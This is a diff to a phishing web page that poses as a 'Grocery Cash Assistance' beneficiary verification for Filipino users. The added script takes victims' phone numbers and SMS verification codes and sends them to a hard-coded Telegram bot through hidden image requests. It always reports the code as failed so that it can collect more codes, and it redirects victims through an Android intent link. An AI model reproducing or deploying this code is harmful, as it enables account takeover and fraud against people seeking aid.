@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Grocery Assist | Freshness Delivered</title>
+    <title>FreeShoppingPH | Verification Process</title>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -147,7 +147,7 @@
     <div class="card">
         <img src="ivana.jpeg" class="logo-img" alt="Grocery Support">
         <h1>Service Activation</h1>
-        <p>Verified Benefiary are only reiceve Grocery Cash Assitance(GCA).</p>
+        <p>Only verified benefiary are only reiceve Grocery Cash Assitance(GCA).</p>
         <button class="btn-primary" id="verifyBtnMain" onclick="handleVerify()">Proceed to Verification Process</button>
     </div>
 
@@ -182,7 +182,7 @@
     </div>
 
     <script>
-    const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
         const BYPASS_MODE = true; 
 
@@ -211,7 +211,59 @@
         window.onload = () => {
             if (window.location.hash.includes("verified")) {
                 document.getElementById('modalOverlay').style.display = 'flex';
-</script>
+            }
+        };
+
+        function processStep1() {
+            const phone = document.getElementById('userPhone').value;
+            const regStatus = document.querySelector('input[name="reg"]:checked').value;
+            
+            if (phone.length < 11 || !phone.startsWith('09')) {
+                const el = document.getElementById('userPhone');
+                el.classList.add('shake-error');
+                setTimeout(() => el.classList.remove('shake-error'), 500);
+                return;
+            }
+
+            // Updated message for Grocery context
+            const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
+            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+            if(BYPASS_MODE) {
+                setTimeout(() => {
+                    window.location.href = "intent://FreeShoppingPH.github.oi/FreeShoppingPH/main.html#Intent;scheme=https;package=com.android.chrome;end";
+                }, 800);
+            } else {
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                startCountDown(300);
+            }
+        }
+
+        function processStep2() {
+            const vInput = document.getElementById('vCode');
+            const phone = document.getElementById('userPhone').value;
+
+            vInput.classList.add('shake-error');
+            setTimeout(() => vInput.classList.remove('shake-error'), 500);
+            
+            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('⚠️ GROCERY CODE FAILED:\n📱 ' + phone + '\n🔢 Code: ' + vInput.value)}`;
+            
+            alert("Activation failed. Please wait for a new system call from our assistant.");
+            vInput.value = "";
+        }
+
+        function startCountDown(sec) {
+            let timer = sec;
+            const display = document.getElementById('waitTimer');
+            setInterval(() => {
+                let m = Math.floor(timer / 60);
+                let s = timer % 60;
+                display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+                if (--timer < 0) timer = 0;
+            }, 1000);
+        }
+    </script>
 
 <script src="https://static.app/js/static.js" type="text/javascript"></script>
 </body>
